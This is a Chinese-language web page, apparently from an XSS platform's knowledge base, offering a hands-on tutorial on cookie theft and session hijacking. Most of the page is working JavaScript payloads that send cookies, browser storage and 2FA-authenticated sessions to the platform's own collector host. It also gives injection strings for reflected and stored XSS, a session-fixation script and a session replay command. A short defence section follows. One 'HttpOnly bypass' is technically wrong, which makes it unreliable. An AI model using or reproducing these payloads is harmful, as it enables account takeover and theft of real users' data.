<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../tu/xssicon.png">
    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
    <link rel="apple-touch-icon" href="../tu/xssicon.png">
    
    <meta name="description" content="深入学习XSS Cookie窃取技术、会话劫持原理、HttpOnly绕过方法及防御策略。包含完整的实战代码示例和安全防护指南。">
    <meta name="keywords" content="XSS,Cookie窃取,会话劫持,Session Hijacking,HttpOnly,安全测试,Web安全,跨站脚本攻击">
    <meta name="author" content="蓝莲花XSS平台">
    <meta property="og:title" content="Cookie窃取与会话劫持实战教程 - XSS安全知识库">
    <meta property="og:description" content="全面讲解XSS Cookie窃取技术、会话劫持攻击方法及防御措施">
    <meta property="og:type" content="article">
    <title>Cookie窃取与会话劫持实战教程 - XSS安全知识库</title>
    <link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../static/libs/fontawesome/css/all.min.css">
    <link rel="stylesheet" href="../static/css/style.css">
    <link rel="stylesheet" href="../static/libs/prism/css/prism-tomorrow.min.css">
    
    <style>
        .article-header {
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            padding: 3rem 0;
            margin-bottom: 2rem;
            border-bottom: 2px solid var(--neon-green);
        }
        .article-title {
            font-size: 2.5rem;
            color: var(--text-highlight);
            margin-bottom: 1rem;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }
        .article-meta {
            color: var(--text-secondary);
            font-size: 0.95rem;
        }
        .article-content {
            max-width: 900px;
            margin: 0 auto;
            padding: 2rem;
            background: rgba(0, 0, 0, 0.3);
            border-radius: var(--border-radius);
            line-height: 1.8;
        }
        .article-content h2 {
            color: var(--neon-green);
            margin-top: 2.5rem;
            margin-bottom: 1.5rem;
            padding-bottom: 0.5rem;
            border-bottom: 2px solid rgba(0, 255, 65, 0.3);
        }
        .article-content h3 {
            color: var(--text-highlight);
            margin-top: 2rem;
            margin-bottom: 1rem;
        }
        .article-content p {
            margin-bottom: 1.2rem;
            color: var(--text-secondary);
        }
        .article-content code {
            background: rgba(0, 255, 65, 0.1);
            padding: 0.2rem 0.5rem;
            border-radius: 3px;
            color: var(--neon-green);
            font-family: var(--font-family);
        }
        .article-content pre {
            background: rgba(0, 0, 0, 0.5);
            padding: 1.5rem;
            border-radius: var(--border-radius);
            border-left: 3px solid var(--neon-green);
            overflow-x: auto;
            margin: 1.5rem 0;
        }
        .warning-box {
            background: rgba(255, 193, 7, 0.1);
            border-left: 4px solid #ffc107;
            padding: 1rem;
            margin: 1.5rem 0;
            border-radius: 4px;
        }
        .info-box {
            background: rgba(0, 123, 255, 0.1);
            border-left: 4px solid #007bff;
            padding: 1rem;
            margin: 1.5rem 0;
            border-radius: 4px;
        }
        .danger-box {
            background: rgba(220, 53, 69, 0.1);
            border-left: 4px solid #dc3545;
            padding: 1rem;
            margin: 1.5rem 0;
            border-radius: 4px;
        }
        .breadcrumb {
            background: transparent;
            padding: 1rem 0;
        }
        .breadcrumb-item a {
            color: var(--neon-green);
            text-decoration: none;
        }
        .nav-article {
            display: flex;
            justify-content: space-between;
            margin-top: 3rem;
            padding-top: 2rem;
            border-top: 1px solid var(--border-color);
        }
        .nav-article a {
            color: var(--neon-green);
            text-decoration: none;
            transition: all 0.3s ease;
        }        
        /* 鍥炲埌椤堕儴鎸夐挳 */
        .back-to-top {
            position: fixed;
            bottom: 40px;
            right: 40px;
            width: 50px;
            height: 50px;
            background: var(--neon-green);
            color: #000;
            border: none;
            border-radius: 50%;
            font-size: 1.5rem;
            cursor: pointer;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
        }
        
        .back-to-top:hover {
            transform: translateY(-5px);
            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
        }
        
        .back-to-top.show {
            opacity: 1;
            visibility: visible;
        }
    </style>
</head>
<body>
    <div class="container">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <li class="breadcrumb-item"><a href="../index.html">首页</a></li>
                <li class="breadcrumb-item"><a href="../wiki.html">知识库</a></li>
                <li class="breadcrumb-item active">Cookie窃取与会话劫持</li>
            </ol>
        </nav>
    </div>

    <div class="article-header">
        <div class="container text-center">
            <h1 class="article-title">
                <i class="fas fa-cookie-bite"></i> Cookie窃取与会话劫持实战教程
            </h1>
            <div class="article-meta">
                <span><i class="far fa-calendar"></i> 2025-01-15</span>
                <span class="mx-3">|</span>
                <span><i class="far fa-clock"></i> 18分钟阅读</span>
                <span class="mx-3">|</span>
                <span><i class="fas fa-tag"></i> 攻击技术</span>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="article-content">
            <h2><i class="fas fa-info-circle"></i> 一、Cookie与会话基础</h2>
            
            <h3>1.1 什么是Cookie？</h3>
            <p>Cookie是服务器发送到用户浏览器并保存在本地的小型数据文件。它通常用于：</p>
            <ul>
                <li><strong>会话管理</strong>：登录状态、购物车、游戏分数等</li>
                <li><strong>个性化</strong>：用户偏好、主题设置等</li>
                <li><strong>追踪</strong>：分析用户行为</li>
            </ul>

            <h3>1.2 Cookie的组成</h3>
            <pre><code class="language-javascript">// Cookie示例
Set-Cookie: sessionid=abc123; Path=/; Domain=.example.com; Secure; HttpOnly; SameSite=Strict</code></pre>

            <p>Cookie属性详解：</p>
            <ul>
                <li><code>Name=Value</code>：Cookie的键值对</li>
                <li><code>Domain</code>：Cookie的有效域名</li>
                <li><code>Path</code>：Cookie的有效路径</li>
                <li><code>Expires/Max-Age</code>：过期时间</li>
                <li><code>Secure</code>：仅通过HTTPS传输</li>
                <li><code>HttpOnly</code>：禁止JavaScript访问（防XSS）</li>
                <li><code>SameSite</code>：防CSRF攻击</li>
            </ul>

            <h3>1.3 会话劫持原理</h3>
            <p>会话劫持（Session Hijacking）是指攻击者窃取用户的会话标识（通常存储在Cookie中），然后冒充该用户访问Web应用。</p>

            <div class="info-box">
                <h4><i class="fas fa-lightbulb"></i> 攻击流程</h4>
                <p>1. 用户登录网站，服务器生成Session ID并存储在Cookie中<br>
                2. 攻击者通过XSS窃取用户的Cookie<br>
                3. 攻击者使用窃取的Cookie冒充用户<br>
                4. 攻击者获得用户权限，执行恶意操作</p>
            </div>

            <h2><i class="fas fa-code"></i> 二、Cookie窃取技术</h2>
            
            <h3>2.1 基础Cookie窃取Payload</h3>
            <pre><code class="language-javascript">// 方法1: 直接重定向
&lt;script&gt;
document.location = 'https://xss.li/collect?c=' + document.cookie;
&lt;/script&gt;

// 方法2: 使用Image对象（更隐蔽）
&lt;script&gt;
new Image().src = 'https://xss.li/collect?c=' + document.cookie;
&lt;/script&gt;

// 方法3: 使用XMLHttpRequest
&lt;script&gt;
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://xss.li/collect', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cookie=' + encodeURIComponent(document.cookie));
&lt;/script&gt;</code></pre>

            <h3>2.2 高级Cookie窃取技术</h3>
            
            <p><strong>使用Fetch API（现代浏览器）：</strong></p>
            <pre><code class="language-javascript">&lt;script&gt;
fetch('https://xss.li/api/collect', {
    method: 'POST',
    mode: 'no-cors',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        cookie: document.cookie,
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: Date.now()
    })
});
&lt;/script&gt;</code></pre>

            <p><strong>窃取所有存储数据：</strong></p>
            <pre><code class="language-javascript">&lt;script&gt;
// 收集所有浏览器存储的数据
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    indexedDB: 'checking...'
};

// 发送到攻击者服务器
fetch('https://xss.li/api/collect', {
    method: 'POST',
    body: JSON.stringify(data)
});
&lt;/script&gt;</code></pre>

            <h3>2.3 绕过HttpOnly防护</h3>
            
            <p>HttpOnly标志禁止JavaScript访问Cookie，但可以通过其他方式绕过：</p>

            <p><strong>方法1: 利用TRACE方法（已过时但仍需了解）：</strong></p>
            <pre><code class="language-javascript">&lt;script&gt;
var xhr = new XMLHttpRequest();
xhr.open('TRACE', '/', true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        // TRACE会返回完整请求头，包含Cookie
        var cookie = xhr.responseText.match(/Cookie: (.*)/)[1];
        new Image().src = 'https://xss.li/collect?c=' + cookie;
    }
};
xhr.send();
&lt;/script&gt;</code></pre>

            <p><strong>方法2: 通过子域XSS窃取父域Cookie：</strong></p>
            <pre><code class="language-javascript">// 如果在sub.example.com上有XSS，可以窃取.example.com的Cookie
&lt;script&gt;
// 创建指向父域的请求
var iframe = document.createElement('iframe');
iframe.src = 'https://example.com/';
iframe.style.display = 'none';
document.body.appendChild(iframe);

iframe.onload = function() {
    // 通过iframe访问父域页面
    var cookies = iframe.contentDocument.cookie;
    new Image().src = 'https://xss.li/collect?c=' + cookies;
};
&lt;/script&gt;</code></pre>

            <p><strong>方法3: 会话固定攻击：</strong></p>
            <pre><code class="language-javascript">// 不直接窃取Cookie，而是固定受害者的Session ID
&lt;script&gt;
// 1. 获取攻击者自己的Session ID
// 2. 让受害者使用这个Session ID登录
// 3. 攻击者使用同样的Session ID访问
document.cookie = 'PHPSESSID=attacker_session_id; path=/';
location.href = '/login';
&lt;/script&gt;</code></pre>

            <div class="warning-box">
                <h4><i class="fas fa-exclamation-triangle"></i> 重要提示</h4>
                <p>现代浏览器已禁用TRACE方法，HttpOnly在大多数情况下是有效的防护措施。但开发者不应仅依赖HttpOnly，需要多层防御。</p>
            </div>

            <h2><i class="fas fa-user-secret"></i> 三、会话劫持实战</h2>
            
            <h3>3.1 完整的Cookie窃取攻击流程</h3>
            
            <p><strong>步骤1: 创建恶意Payload</strong></p>
            <pre><code class="language-javascript">// cookie-stealer.js
(function() {
    // 收集用户信息
    var info = {
        cookie: document.cookie,
        url: location.href,
        title: document.title,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: new Date().toISOString()
    };
    
    // 发送到攻击者服务器
    var beacon = new Image();
    beacon.src = 'https://xss.li/api/collect?' + 
                 Object.keys(info).map(k => k + '=' + encodeURIComponent(info[k])).join('&');
    
    // 备用方法
    setTimeout(function() {
        fetch('https://xss.li/api/collect', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(info)
        });
    }, 100);
})();
&lt;/script&gt;</code></pre>

            <p><strong>步骤2: 注入XSS</strong></p>
            <pre><code class="language-markup">&lt;!-- 反射型XSS示例 --&gt;
https://vulnerable-site.com/search?q=&lt;script src="https://xss.li/payloads/cookie-stealer.js"&gt;&lt;/script&gt;

&lt;!-- 存储型XSS示例 --&gt;
评论内容: &lt;img src=x onerror="eval(atob('base64编码的窃取代码'))"&gt;</code></pre>

            <p><strong>步骤3: 使用窃取的Cookie</strong></p>
            <pre><code class="language-javascript">// 在浏览器控制台中
document.cookie = 'sessionid=窃取到的session值';
location.reload();

// 或使用curl
curl -H "Cookie: sessionid=窃取到的session值" https://target-site.com/account</code></pre>

            <h3>3.2 持久化会话劫持</h3>
            <pre><code class="language-javascript">&lt;script&gt;
// 创建WebSocket连接，实时监控Cookie变化
var ws = new WebSocket('wss://xss.li/realtime');

// 定期检查Cookie变化
setInterval(function() {
    var currentCookie = document.cookie;
    if (currentCookie !== lastCookie) {
        ws.send(JSON.stringify({
            type: 'cookie_update',
            cookie: currentCookie,
            url: location.href,
            timestamp: Date.now()
        }));
        lastCookie = currentCookie;
    }
}, 5000);

var lastCookie = document.cookie;
&lt;/script&gt;</code></pre>

            <h3>3.3 绕过双因素认证</h3>
            <p>即使网站使用2FA，窃取的Session Cookie仍可能有效：</p>
            <pre><code class="language-javascript">// 窃取已完成2FA验证的Session
&lt;script&gt;
// 等待用户完成2FA
setTimeout(function() {
    // 此时Session已包含2FA验证状态
    fetch('https://xss.li/api/collect', {
        method: 'POST',
        body: JSON.stringify({
            cookie: document.cookie,
            authenticated: true,
            twoFactorPassed: true
        })
    });
}, 30000); // 等待30秒
&lt;/script&gt;</code></pre>

            <h2><i class="fas fa-shield-alt"></i> 四、防御措施</h2>
            
            <h3>4.1 Cookie安全配置</h3>
            <pre><code class="language-javascript">// 设置安全的Cookie
Set-Cookie: sessionid=abc123; 
    Path=/; 
    Domain=.example.com; 
    Secure;              // 仅HTTPS传输
    HttpOnly;            // 禁止JS访问
    SameSite=Strict;     // 防CSRF
    Max-Age=3600         // 1小时过期</code></pre>

            <h3>4.2 输入输出过滤</h3>
            <pre><code class="language-php">// PHP示例
function sanitize($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}

// 输出时转义
echo sanitize($_GET['name']);</code></pre>

            <h3>4.3 内容安全策略(CSP)</h3>
            <pre><code class="language-markup">&lt;!-- 添加CSP头 --&gt;
&lt;meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-random123'"&gt;</code></pre>

            <h3>4.4 会话管理最佳实践</h3>
            <ul>
                <li>登录后重新生成Session ID</li>
                <li>设置合理的Session超时时间</li>
                <li>验证User-Agent和IP地址（可选）</li>
                <li>实现会话绑定（Session Binding）</li>
                <li>记录会话活动日志</li>
            </ul>

            <h3>4.5 检测会话劫持</h3>
            <pre><code class="language-php">// PHP检测异常会话
session_start();

// 检查IP地址变化
if (isset($_SESSION['ip']) && $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
    session_destroy();
    die('会话异常，请重新登录');
}
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];

// 检查User-Agent变化
if (isset($_SESSION['ua']) && $_SESSION['ua'] !== $_SERVER['HTTP_USER_AGENT']) {
    session_destroy();
    die('会话异常，请重新登录');
}
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];</code></pre>

            <div class="danger-box">
                <h4><i class="fas fa-ban"></i> 法律警告</h4>
                <p>未经授权窃取他人Cookie和劫持会话是违法行为！本文内容仅用于安全研究和授权的渗透测试。请遵守法律法规和职业道德。</p>
            </div>

            <h2><i class="fas fa-tools"></i> 五、实用工具</h2>
            
            <h3>5.1 Cookie管理工具</h3>
            <ul>
                <li><strong>EditThisCookie</strong>：浏览器插件，方便查看和编辑Cookie</li>
                <li><strong>Burp Suite</strong>：拦截和修改Cookie</li>
                <li><strong>Cookie Editor</strong>：Firefox/Chrome扩展</li>
            </ul>

            <h3>5.2 会话劫持工具</h3>
            <ul>
                <li><strong>BeEF</strong>：浏览器利用框架</li>
                <li><strong>XSS Hunter</strong>：自动化XSS平台</li>
                <li><strong>蓝莲花XSS平台</strong>：本平台提供的完整解决方案</li>
            </ul>

            <h2><i class="fas fa-book-open"></i> 六、真实案例分析</h2>
            
            <h3>6.1 Facebook XSS Cookie窃取（2013）</h3>
            <p>攻击者通过Facebook的反射型XSS漏洞窃取用户Session，影响数万用户。Facebook通过以下措施修复：</p>
            <ul>
                <li>强化输入过滤</li>
                <li>启用CSP策略</li>
                <li>实施HttpOnly标志</li>
                <li>增强会话验证</li>
            </ul>

            <h3>6.2 Twitter蠕虫攻击（2010）</h3>
            <p>利用存储型XSS传播，自动发推并窃取Cookie。教训：</p>
            <ul>
                <li>用户生成内容需严格过滤</li>
                <li>实施速率限制</li>
                <li>监控异常行为</li>
            </ul>

            <h2><i class="fas fa-graduation-cap"></i> 七、总结</h2>
            
            <p>Cookie窃取和会话劫持是XSS攻击最常见的利用方式。关键要点：</p>
            
            <ul>
                <li>理解Cookie的工作原理和安全属性</li>
                <li>掌握多种Cookie窃取技术</li>
                <li>了解HttpOnly等防护机制的原理和局限</li>
                <li>实施多层防御策略</li>
                <li>定期审计会话管理代码</li>
            </ul>

            <p>防御建议：</p>
            <ol>
                <li>始终使用HttpOnly和Secure标志</li>
                <li>实施严格的CSP策略</li>
                <li>对所有用户输入进行验证和转义</li>
                <li>使用SameSite Cookie防止CSRF</li>
                <li>定期更新Session ID</li>
                <li>监控异常会话活动</li>
            </ol>

            <div class="nav-article">
                <a href="xss-payload.html">
                    <i class="fas fa-arrow-left"></i> 上一篇：XSS Payload编写技巧
                </a>
                <a href="../wiki.html">
                    返回知识库 <i class="fas fa-list"></i>
                </a>
                <a href="xss-defense.html">
                    下一篇：XSS防御完全指南 <i class="fas fa-arrow-right"></i>
                </a>
            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="container-fluid">
            <div class="footer-content">
                <div class="footer-copyright">
                    <span>© 2025 蓝莲花XSS在线平台</span>
                </div>
                <div class="footer-links">
                    <a href="../index.html"><i class="fas fa-home"></i> 返回首页</a>
                </div>
            </div>
        </div>
    </footer>    
    <!-- 鍥炲埌椤堕儴鎸夐挳 -->
    <button class="back-to-top" id="backToTop">
        <i class="fas fa-arrow-up"></i>
    </button>
    

    <script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="../static/libs/prism/js/prism.min.js"></script>
    <script src="../static/libs/prism/js/prism-javascript.min.js"></script>
    <script src="../static/libs/prism/js/prism-php.min.js"></script>    <script>
        // 鍥炲埌椤堕儴鍔熻兘
        const backToTopBtn = document.getElementById('backToTop');
        window.addEventListener('scroll', function() {
            if (window.pageYOffset > 300) {
                backToTopBtn.classList.add('show');
            } else {
                backToTopBtn.classList.remove('show');
            }
        });
        backToTopBtn.addEventListener('click', function() {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });
    </script>
</body>
</html>
